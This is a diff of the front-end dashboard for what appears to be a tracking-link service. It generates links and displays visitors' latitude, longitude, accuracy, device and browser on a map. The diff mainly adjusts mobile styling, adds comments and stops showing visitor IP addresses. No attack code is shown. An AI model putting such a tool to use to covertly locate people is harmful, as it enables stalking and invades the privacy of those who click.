@@ -105,7 +105,7 @@ select option{background:#060a0f}
 .no-select p{font-family:'Space Mono',monospace;font-size:.7rem;line-height:1.65}
 
 /* hits */
-.hits-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:.8rem;margin-bottom:1.1rem}
+.hits-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:.8rem;margin-bottom:1.1rem}
 .hit-card{background:var(--s);border:1px solid var(--border);border-radius:8px;padding:.85rem .95rem;animation:fadeUp .3s ease both}
 @keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
 .hit-num{font-family:'Space Mono',monospace;font-size:.57rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.5rem}
@@ -115,7 +115,6 @@ select option{background:#060a0f}
 .hv{font-family:'Space Mono',monospace;font-size:.73rem;color:var(--text);text-align:right;max-width:55%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .hv.green{color:var(--accent)}
 .hv.blue{color:var(--accent2)}
-.hv.ip{color:#ffaa44}
 .map-link{display:inline-flex;align-items:center;gap:5px;margin-top:.5rem;font-family:'Space Mono',monospace;font-size:.6rem;color:var(--accent);text-decoration:none;border:1px solid rgba(0,255,136,0.2);padding:4px 10px;border-radius:3px;transition:background .15s}
 .map-link:hover{background:rgba(0,255,136,0.08)}
 
@@ -146,6 +145,7 @@ select option{background:#060a0f}
     overflow:hidden;
   }
 
+  /* sidebar fills full height when active */
   .sidebar{
     position:absolute;
     top:var(--nav-h);
@@ -160,6 +160,7 @@ select option{background:#060a0f}
   }
   .sidebar.mob-active{display:flex}
 
+  /* main fills full height when active */
   .main{
     position:absolute;
     top:var(--nav-h);
@@ -172,14 +173,23 @@ select option{background:#060a0f}
   .main.mob-active{display:flex}
 
   .mob-bottom{display:flex}
+
+  /* tighter mobile padding */
   .main-body{padding:.75rem}
   .main-header{padding:.75rem .85rem}
   .sidebar-header{padding:.75rem}
+
   .hits-grid{grid-template-columns:1fr;gap:.65rem}
   .map-wrap{height:200px}
+
+  /* hide user greeting on very small screens */
   .nav-user{display:none}
+
+  /* bigger touch targets */
   .link-card{padding:.85rem .9rem;margin-bottom:.5rem}
   .lc-del{padding:6px 8px;font-size:.82rem}
+
+  /* toast above bottom nav */
   .toast-wrap{bottom:calc(var(--mob-bar) + 10px)}
 }
 
@@ -201,6 +211,7 @@ select option{background:#060a0f}
 </nav>
 
 <div class="layout">
+  <!-- SIDEBAR -->
   <aside class="sidebar" id="sidebarPanel">
     <div class="sidebar-header">
       <div class="sidebar-title">Generate New Link</div>
@@ -237,6 +248,7 @@ select option{background:#060a0f}
     </div>
   </aside>
 
+  <!-- MAIN -->
   <main class="main" id="mainPanel">
     <div class="main-header">
       <div style="min-width:0;flex:1">
@@ -254,6 +266,7 @@ select option{background:#060a0f}
   </main>
 </div>
 
+<!-- Mobile bottom nav -->
 <div class="mob-bottom" id="mobBottom">
   <button class="mob-tab active" id="mobGenTab" onclick="mobSwitch('sidebar')">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
@@ -265,6 +278,7 @@ select option{background:#060a0f}
   </button>
 </div>
 
+<!-- Toast container -->
 <div class="toast-wrap" id="toastWrap"></div>
 
 <script>
@@ -272,9 +286,10 @@ select option{background:#060a0f}
 let activeLinkId = null;
 let pollTimer = null;
 let mapInstance = null;
-let lastGeneratedUrl = '';
+let lastGeneratedUrl = '';   // persists across loadLinks() re-renders
 const isMobile = () => window.innerWidth <= 700;
 
+/* ── Toast (replaces alert) ─────────────────────────────────────── */
 function toast(msg, type = 'success', ms = 2800) {
   const wrap = document.getElementById('toastWrap');
   const el = document.createElement('div');
@@ -284,6 +299,7 @@ function toast(msg, type = 'success', ms = 2800) {
   setTimeout(() => { el.style.opacity='0'; el.style.transition='opacity .3s'; setTimeout(()=>el.remove(),300); }, ms);
 }
 
+/* ── Mobile panel switch ────────────────────────────────────────── */
 function mobSwitch(panel) {
   document.getElementById('sidebarPanel').classList.toggle('mob-active', panel==='sidebar');
   document.getElementById('mainPanel').classList.toggle('mob-active', panel==='main');
@@ -297,6 +313,7 @@ function initMobile() {
   }
 }
 
+/* ── Auth check ─────────────────────────────────────────────────── */
 (async () => {
   try {
     const res = await fetch('/api/me', { credentials: 'same-origin' });
@@ -316,6 +333,7 @@ async function logout() {
   window.location.href = '/';
 }
 
+/* ── API helper ─────────────────────────────────────────────────── */
 async function apiFetch(url, opts={}) {
   opts.credentials = 'same-origin';
   opts.headers = { ...(opts.headers||{}), 'Content-Type':'application/json' };
@@ -327,6 +345,7 @@ async function apiFetch(url, opts={}) {
   return data;
 }
 
+/* ── Generate link ──────────────────────────────────────────────── */
 async function generateLink() {
   const dest = document.getElementById('destUrl').value.trim();
   if (!dest) { toast('Enter a destination URL', 'error'); return; }
@@ -371,6 +390,7 @@ function copyGenLink() {
     setTimeout(() => { btn.textContent = 'Copy Link'; btn.classList.remove('copied'); }, 2500);
   }
 
+  // Try modern clipboard API first (requires HTTPS)
   if (navigator.clipboard && window.isSecureContext) {
     navigator.clipboard.writeText(txt).then(onCopied).catch(() => fallbackCopy(txt, onCopied));
   } else {
@@ -379,12 +399,14 @@ function copyGenLink() {
 }
 
 function fallbackCopy(txt, onCopied) {
+  // Works on HTTP and all mobile browsers
   const ta = document.createElement('textarea');
   ta.value = txt;
   ta.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none';
   document.body.appendChild(ta);
   ta.focus();
   ta.select();
+  // iOS needs setSelectionRange
   ta.setSelectionRange(0, 99999);
   try {
     const ok = document.execCommand('copy');
@@ -396,10 +418,12 @@ function fallbackCopy(txt, onCopied) {
   document.body.removeChild(ta);
 }
 
+/* ── Load links list ────────────────────────────────────────────── */
 async function loadLinks() {
   try {
     const links = await apiFetch('/api/links');
     renderLinksList(links);
+    // Restore generated link box if it was showing
     if (lastGeneratedUrl) showGenResult(lastGeneratedUrl);
   } catch(e) {}
 }
@@ -427,11 +451,13 @@ function renderLinksList(links) {
   }).join('');
 }
 
+/* On mobile: select link AND switch to hits tab */
 function selectLinkMob(id) {
   selectLink(id);
   if (isMobile()) mobSwitch('main');
 }
 
+/* ── Select link & poll ─────────────────────────────────────────── */
 function selectLink(id) {
   activeLinkId = id;
   if (pollTimer) clearInterval(pollTimer);
@@ -476,7 +502,6 @@ function renderHits(data) {
     [...hits].reverse().forEach((h, i) => {
       html += `<div class="hit-card" style="animation-delay:${i*0.05}s">
         <div class="hit-num">Hit #${hits.length-i}</div>
-        <div class="hit-row"><span class="hk">IP Address</span><span class="hv ip">${h.ip || '—'}</span></div>
         <div class="hit-row"><span class="hk">Latitude</span><span class="hv green">${h.lat ?? '—'}</span></div>
         <div class="hit-row"><span class="hk">Longitude</span><span class="hv green">${h.lon ?? '—'}</span></div>
         <div class="hit-row"><span class="hk">Accuracy</span><span class="hv">${h.acc ? h.acc+'m' : '—'}</span></div>
@@ -505,7 +530,7 @@ function renderHits(data) {
       validHits.forEach((h, i) => {
         L.circleMarker([h.lat,h.lon], { radius:8, fillColor:'#00ff88', color:'#000', weight:2, opacity:1, fillOpacity:.85 })
           .addTo(mapInstance)
-          .bindPopup(`<b>Hit #${i+1}</b><br>IP: ${h.ip || 'Unknown'}<br>${h.lat}, ${h.lon}<br>${h.device}/${h.browser}`);
+          .bindPopup(`<b>Hit #${i+1}</b><br>${h.lat}, ${h.lon}<br>${h.device}/${h.browser}`);
         bounds.push([h.lat,h.lon]);
       });
       bounds.length===1 ? mapInstance.setView(bounds[0],13) : mapInstance.fitBounds(bounds,{padding:[20,20]});
@@ -531,6 +556,7 @@ async function deleteLink(e, id) {
   } catch(e) { toast(e.message, 'error'); }
 }
 
+/* ── Helpers ────────────────────────────────────────────────────── */
 function getDomain(url) { try { return new URL(url).hostname; } catch(e) { return url; } }
 function esc(s) { return String(s||'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
 function fmtDate(iso) {
